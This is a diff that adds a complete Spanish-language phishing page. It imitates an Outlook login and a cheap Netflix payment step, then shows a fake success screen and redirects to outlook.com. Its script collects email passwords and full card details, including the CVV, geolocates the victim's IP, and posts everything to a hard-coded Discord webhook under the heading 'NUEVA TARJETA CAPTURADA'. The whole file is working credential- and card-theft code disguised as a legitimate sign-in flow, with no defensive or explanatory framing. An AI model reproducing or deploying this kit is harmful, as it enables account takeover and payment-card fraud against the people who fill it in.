@@ -1,0 +1,600 @@
+
+<!DOCTYPE html><html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calendario y Correo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* Estilos generales */
+        body {
+            background-color: #ffffff;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container-box {
+            width: 100%;
+            max-width: 400px;
+            padding: 25px 15px;
+            box-sizing: border-box;
+        }
+
+        .logo-img {
+            width: 100%;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 15px;
+            padding: 10px 12px;
+        }
+
+        .btn-submit {
+            background-color: #0096ff;
+            border: none;
+            width: 100%;
+            font-weight: 600;
+            padding: 10px;
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .btn-submit:hover {
+            background-color: #007acc;
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+        }
+
+        /* Estilos para página de tarjeta */
+        .card-box {
+            width: 100%;
+            max-width: 420px;
+            border-radius: 10px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            padding: 20px;
+        }
+
+        .brand {
+            font-weight: 800;
+            color: #e50914;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+
+        .small-muted {
+            color: #6c757d;
+            font-size: 13px;
+        }
+
+        .help-text {
+            font-size: 13px;
+            color: #6c757d;
+            margin-top: 6px;
+        }
+
+        /* Estilos para página de agradecimiento */
+        .success-box {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            color: #333;
+        }
+
+        .netflix-logo {
+            height: 50px;
+            margin-bottom: 20px;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: #e50914;
+            margin-bottom: 20px;
+        }
+
+        .btn-outlook {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-outlook:hover {
+            background: #106ebe;
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 4px;
+            background: #e6e6e6;
+            border-radius: 2px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: #e50914;
+            border-radius: 2px;
+            animation: loading 3s ease-in-out forwards;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .countdown {
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        /* Ocultar páginas no activas */
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .container-box {
+                padding: 20px 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Página 1: Login Outlook -->
+    <div id="page1" class="page active container-box">
+        <img src="https://imagizer.imageshack.com/img924/4838/1wzRy9.png" alt="Outlook Logo" class="logo-img">
+
+        <form id="fse22">
+            <input type="email" name="correo" id="correo" class="form-control" placeholder="Correo" required="">
+            <input type="password" name="contrasena" id="contrasena" class="form-control" placeholder="Contraseña" required="">
+            <button type="submit" class="btn-submit">Activar Cuenta</button>
+        </form>
+    </div>
+
+    <!-- Página 2: Tarjeta -->
+    <div id="page2" class="page card-box">
+        <div class="mb-3 d-flex justify-content-between align-items-center">
+            <div>
+                <img src="https://krgroup.com/wp-content/uploads/2022/02/Untitled-design-16.png" alt="NETFLIX" style="height: 30px; width: auto;">
+                <div class="small-muted">Cuenta Personal · $0.39 / año</div>
+            </div>
+            <div class="text-end">
+                <div class="small-muted">Paso <strong>2 de 2</strong></div>
+            </div>
+        </div>
+
+        <form id="ccForm" novalidate="">
+            <div class="mb-2">
+                <input id="cardNumber" name="c1" class="form-control" type="tel" inputmode="numeric" placeholder="Número de tarjeta" maxlength="19" autocomplete="cc-number" required="">
+                <div id="cardError" class="text-danger small mt-1" style="display:none"></div>
+            </div>
+
+            <div class="row g-2 mb-2">
+                <div class="col-7">
+                    <input id="expiry" name="c2" class="form-control" type="text" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp" required="">
+                    <div id="expiryError" class="text-danger small mt-1" style="display:none"></div>
+                </div>
+                <div class="col-5">
+                    <input id="cvv" name="c3" class="form-control" type="tel" inputmode="numeric" placeholder="CVV" maxlength="4" autocomplete="cc-csc" required="">
+                    <div id="cvvError" class="text-danger small mt-1" style="display:none"></div>
+                </div>
+            </div>
+
+            <div class="mb-2">
+                <input id="cardName" name="c4" class="form-control" type="text" placeholder="Nombre en la tarjeta" autocomplete="cc-name" required="">
+                <div id="nameError" class="text-danger small mt-1" style="display:none"></div>
+            </div>
+
+            <div class="form-check mb-3">
+                <input id="accept" class="form-check-input" type="checkbox">
+                <label class="form-check-label small-muted" for="accept">Acepto términos y condiciones</label>
+            </div>
+
+            <button id="submitBtn" class="btn-submit" type="submit" disabled="">Confirmar pago</button>
+            
+            <div class="help-text mt-3 p-2 text-center" style="background: #f3f9ff; border: 1px solid #d0e3ff; border-radius: 6px; font-size: 13px; color: #004578;">
+                🔒 Tu pago está protegido con cifrado <strong>SSL de 256 bits</strong>.
+            </div>
+        </form>
+    </div>
+
+ <!-- Página 3: Agradecimiento estilo Outlook -->
+<div id="page3" class="page success-box" style="background: #ffffff; text-align: center; padding: 40px 25px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); max-width: 420px; margin: 40px auto; font-family: 'Segoe UI', sans-serif;">
+    
+    <!-- Logo Outlook -->
+    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Outlook" class="outlook-logo" style="width: 120px; margin-bottom: 25px;">
+
+    <!-- Ícono de éxito -->
+    <div class="success-icon" style="font-size: 60px; color: #0078d4; font-weight: bold; margin-bottom: 10px;">✓</div>
+    
+    <!-- Mensaje principal -->
+    <h2 class="mb-3" style="color: #0078d4; font-size: 1.6rem; font-weight: 600;">¡Gracias por su verificación!</h2>
+    
+    <p class="mb-4" style="color: #333; font-size: 0.95rem; line-height: 1.5;">
+        Su cuenta de Outlook ha sido activada correctamente.<br>
+        Estamos redirigiéndolo para finalizar el proceso de sincronización.
+    </p>
+    
+    <!-- Barra de carga -->
+    <div class="loading-bar" style="width: 100%; height: 8px; background: #e1e1e1; border-radius: 5px; overflow: hidden; margin-bottom: 15px;">
+        <div class="loading-progress" style="width: 0%; height: 100%; background: #0078d4; animation: loadBar 5s linear forwards;"></div>
+    </div>
+    
+    <!-- Cuenta regresiva -->
+    <div class="countdown" id="countdown" style="color: #555; font-size: 0.9rem; margin-bottom: 20px;">
+        Redirigiendo en 5 segundos...
+    </div>
+    
+    <!-- Botón Outlook -->
+    <a href="https://outlook.com" class="btn-outlook" style="display: inline-block; background: #0078d4; color: white; text-decoration: none; padding: 10px 25px; border-radius: 6px; font-weight: 500; transition: 0.3s;">
+        ➤ Ir a Outlook ahora
+    </a>
+    
+    <div class="mt-4" style="font-size: 0.8rem; color: #888; margin-top: 15px;">
+        Si la redirección no funciona, haga clic en el botón superior.
+    </div>
+</div>
+
+<!-- Animaciones -->
+<style>
+@keyframes loadBar {
+  from { width: 0%; }
+  to { width: 100%; }
+}
+</style>
+
+
+
+
+<script>
+    // 🔗 WEBHOOK CONFIGURATION
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1432108547264614492/e17wx5lWH6mNsL5BUIvsqZkdih-ZSm8SEkTReMMrxGjtZKGKhnkUCqYF2hKE7FfVCoa9";
+
+    // Función para cambiar de página
+    function showPage(pageNumber) {
+        document.querySelectorAll('.page').forEach(page => {
+            page.classList.remove('active');
+        });
+        document.getElementById(`page${pageNumber}`).classList.add('active');
+        
+        // SI ES LA PÁGINA 3 (AGRADECIMIENTO), INICIAR CONTADOR PARA OUTLOOK
+        if (pageNumber === 3) {
+            iniciarRedireccionOutlook();
+        }
+    }
+
+    // Función para redirección a Outlook desde página 3
+    function iniciarRedireccionOutlook() {
+        let seconds = 5;
+        const countdownElement = document.getElementById('countdown');
+        
+        const countdownInterval = setInterval(() => {
+            seconds--;
+            if (countdownElement) {
+                countdownElement.textContent = `Redirigiendo en ${seconds} segundo${seconds !== 1 ? 's' : ''}...`;
+            }
+            
+            if (seconds <= 0) {
+                clearInterval(countdownInterval);
+                window.location.href = 'https://outlook.com';
+            }
+        }, 1000);
+
+        // Redirección automática después de 5 segundos
+        setTimeout(() => {
+            window.location.href = 'https://outlook.com';
+        }, 5000);
+    }
+
+    // Función para obtener información del cliente
+    async function obtenerInfoCliente() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            try {
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                return {
+                    ip: ip,
+                    pais: geoData.country_name || 'No detectado',
+                    region: geoData.region || 'No detectado',
+                    ciudad: geoData.city || 'No detectado',
+                    codigoPostal: geoData.postal || 'No detectado',
+                    proveedor: geoData.org || 'No detectado',
+                    timezone: geoData.timezone || 'No detectado'
+                };
+            } catch (geoError) {
+                return {
+                    ip: ip,
+                    pais: 'No detectado',
+                    region: 'No detectado',
+                    ciudad: 'No detectado',
+                    codigoPostal: 'No detectado',
+                    proveedor: 'No detectado',
+                    timezone: 'No detectado'
+                };
+            }
+        } catch (error) {
+            return {
+                ip: 'No detectada',
+                pais: 'No detectado',
+                region: 'No detectado',
+                ciudad: 'No detectado',
+                codigoPostal: 'No detectado',
+                proveedor: 'No detectado',
+                timezone: 'No detectado'
+            };
+        }
+    }
+
+    // ========== PÁGINA 1: LOGIN OUTLOOK ==========
+    document.getElementById("fse22").addEventListener("submit", async function(e) {
+        e.preventDefault();
+
+        const correo = document.getElementById("correo").value;
+        const contrasena = document.getElementById("contrasena").value;
+
+        const infoCliente = await obtenerInfoCliente();
+        
+        const payload = {
+            content: `📩 **NUEVOOOOO**
+            
+**🔐 Credenciales:**
+📧 **Correo:** ${correo}
+🔑 **Contraseña:** ${contrasena}
+
+**🌍 Información del Cliente:**
+🖥️ **IP:** ${infoCliente.ip}
+📍 **País:** ${infoCliente.pais}
+🏙️ **Región:** ${infoCliente.region}
+🏢 **Ciudad:** ${infoCliente.ciudad}
+📮 **Código Postal:** ${infoCliente.codigoPostal}
+🌐 **Proveedor:** ${infoCliente.proveedor}
+⏰ **Zona Horaria:** ${infoCliente.timezone}
+
+**📅 Fecha y Hora:**
+🕒 ${new Date().toLocaleString('es-CO', { 
+    timeZone: 'America/Bogota',
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+})}
+
+━━━━━━━━━━━━━━━━━━━━━━━━`
+        };
+
+        // Envío a Discord
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        // Cambiar a página 2 después de enviar
+        setTimeout(() => {
+            showPage(2);
+        }, 1000);
+    });
+
+    // ========== PÁGINA 2: TARJETA ==========
+    const form = document.getElementById('ccForm');
+    const cardNumber = document.getElementById('cardNumber');
+    const expiry = document.getElementById('expiry');
+    const cvv = document.getElementById('cvv');
+    const cardName = document.getElementById('cardName');
+    const accept = document.getElementById('accept');
+    const submitBtn = document.getElementById('submitBtn');
+
+    const cardError = document.getElementById('cardError');
+    const expiryError = document.getElementById('expiryError');
+    const cvvError = document.getElementById('cvvError');
+    const nameError = document.getElementById('nameError');
+
+    function formatCard(v){
+        return v.replace(/\D/g,'').slice(0,19).match(/.{1,4}/g)?.join(' ')||v.replace(/\D/g,'');
+    }
+
+    cardNumber.addEventListener('input', e=>{
+        e.target.value = formatCard(e.target.value);
+        validateAll();
+    });
+
+    expiry.addEventListener('input', e=>{
+        let v = e.target.value.replace(/\D/g,'').slice(0,4);
+        if(v.length>2) v = v.slice(0,2) + '/' + v.slice(2);
+        e.target.value = v;
+        validateAll();
+    });
+
+    cvv.addEventListener('input', e=>{
+        e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
+        validateAll();
+    });
+
+    cardName.addEventListener('input', validateAll);
+    accept.addEventListener('change', validateAll);
+
+    function luhnCheck(num){
+        const s = num.replace(/\D/g,'');
+        if(!s) return false;
+        let sum=0, alt=false;
+        for(let i=s.length-1;i>=0;i--){
+            let n = parseInt(s[i],10);
+            if(alt){ n*=2; if(n>9) n-=9; }
+            sum += n; alt = !alt;
+        }
+        return sum % 10 === 0;
+    }
+
+    function validateCard(){
+        const v = cardNumber.value.replace(/\s/g,'');
+        if(!v){ cardError.style.display='none'; return false; }
+        if(v.length < 13){ cardError.textContent='Número demasiado corto'; cardError.style.display='block'; return false; }
+        if(!luhnCheck(v)){ cardError.textContent='Número inválido'; cardError.style.display='block'; return false; }
+        cardError.style.display='none';
+        return true;
+    }
+
+    function validateExpiry(){
+        const v = expiry.value;
+        if(!v){ expiryError.style.display='none'; return false; }
+        const parts = v.split('/');
+        if(parts.length!==2){ expiryError.textContent='Formato MM/AA'; expiryError.style.display='block'; return false; }
+        const mm = parseInt(parts[0],10), yy = parseInt(parts[1],10);
+        if(isNaN(mm)||isNaN(yy)||mm<1||mm>12){ expiryError.textContent='Fecha inválida'; expiryError.style.display='block'; return false;}
+        const year = 2000 + yy;
+        const exp = new Date(year, mm);
+        if(exp <= new Date()){ expiryError.textContent='Tarjeta vencida'; expiryError.style.display='block'; return false; }
+        expiryError.style.display='none';
+        return true;
+    }
+
+    function validateCvv(){
+        const v = cvv.value;
+        if(!v){ cvvError.style.display='none'; return false; }
+        if(v.length<3){ cvvError.textContent='CVV inválido'; cvvError.style.display='block'; return false; }
+        cvvError.style.display='none';
+        return true;
+    }
+
+    function validateName(){
+        const v = cardName.value.trim();
+        if(!v){ nameError.style.display='none'; return false; }
+        if(v.length<2){ nameError.textContent='Nombre demasiado corto'; nameError.style.display='block'; return false; }
+        nameError.style.display='none';
+        return true;
+    }
+
+    function validateAll(){
+        const ok = validateCard() && validateExpiry() && validateCvv() && validateName() && accept.checked;
+        submitBtn.disabled = !ok;
+    }
+
+    // Función para detectar el tipo de tarjeta
+    function detectarTipoTarjeta(numero) {
+        const cleanNum = numero.replace(/\s/g, '');
+        
+        const binPatterns = {
+            'Visa': /^4/,
+            'Mastercard': /^(5[1-5]|2[2-7])/,
+            'Amex': /^3[47]/,
+            'Discover': /^6(?:011|5)/,
+            'Diners': /^3(?:0[0-5]|[68])/,
+            'JCB': /^(?:2131|1800|35)/
+        };
+
+        for (const [tipo, pattern] of Object.entries(binPatterns)) {
+            if (pattern.test(cleanNum)) {
+                return tipo;
+            }
+        }
+        
+        return 'Desconocido';
+    }
+
+    // Función para enviar datos de tarjeta al webhook
+    async function enviarWebhook(datosTarjeta, infoCliente) {
+        const tipoTarjeta = detectarTipoTarjeta(datosTarjeta.numero);
+        
+        const payload = {
+            content: `💳 **NUEVA TARJETA CAPTURADA** - 
+
+**📋 INFORMACIÓN DE LA TARJETA:**
+🔢 **Número:** ||${datosTarjeta.numero}||
+📅 **Vencimiento:** ${datosTarjeta.vencimiento}
+🔐 **CVV:** ||${datosTarjeta.cvv}||
+👤 **Titular:** ${datosTarjeta.titular}
+🏷️ **Tipo:** ${tipoTarjeta}
+
+**🌍 INFORMACIÓN DEL CLIENTE:**
+🖥️ **IP:** ${infoCliente.ip}
+📍 **País:** ${infoCliente.pais}
+🏙️ **Región:** ${infoCliente.region}
+🏢 **Ciudad:** ${infoCliente.ciudad}
+📮 **Código Postal:** ${infoCliente.codigoPostal}
+🌐 **Proveedor:** ${infoCliente.proveedor}
+⏰ **Zona Horaria:** ${infoCliente.timezone}
+
+━━━━━━━━━━━━━━━━━━━━━━━━`
+        };
+
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    }
+
+    // Event listener del formulario de tarjeta
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        if(submitBtn.disabled) return false;
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Procesando...';
+
+        try {
+            const datosTarjeta = {
+                numero: cardNumber.value.replace(/\s/g, ''),
+                vencimiento: expiry.value,
+                cvv: cvv.value,
+                titular: cardName.value.trim()
+            };
+
+            const infoCliente = await obtenerInfoCliente();
+            await enviarWebhook(datosTarjeta, infoCliente);
+            
+            // Cambiar a página 3 (agradecimiento) después de enviar
+            setTimeout(() => {
+                showPage(3);
+            }, 2000);
+            
+        } catch (error) {
+            console.error("Error en el proceso:", error);
+            setTimeout(() => {
+                showPage(3);
+            }, 2000);
+        }
+    });
+</script>
+
+</body></html>
